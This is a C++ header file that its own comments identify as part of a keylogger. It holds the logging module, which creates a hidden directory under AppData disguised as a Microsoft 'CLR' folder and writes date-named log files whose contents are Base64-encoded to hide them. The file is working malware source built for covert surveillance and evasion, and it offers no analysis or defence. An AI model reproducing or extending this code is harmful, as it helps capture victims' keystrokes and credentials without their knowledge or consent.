#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>  //Standard lib in C to get environment
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include <fstream>

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    //Check if the / needed in the end of the path
    //If needed the add it, or not
    {
        //Where to save your log file: C:\Users\USERNAME\AppData\Roaming
        std::string appdata_dir(getenv("APPDATA"));
        //FUNCTION: GET environment variable where contained AppData folder
        std::string full = appdata_dir + "\\Microsoft\\CLR";    //get into save file
        return full + (append_seperator ? "\\" : "");
    }

    //Making the directory
    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    //BACKUP SITUATION
    bool MKDir(std::string path)
    {
        for(char &c : path)
            if (c == '\\')
            {
                c = '\0';
                if (!MkOneDr(path))
                    return false;
                c = '\\';
            }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        //Create a log file which named after the date time
        //You can add more variable in name in order to distinguish many keylogger
        std::string path  = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if (!file) return "";   //if file return empty string => having error
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;

            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // IO_H
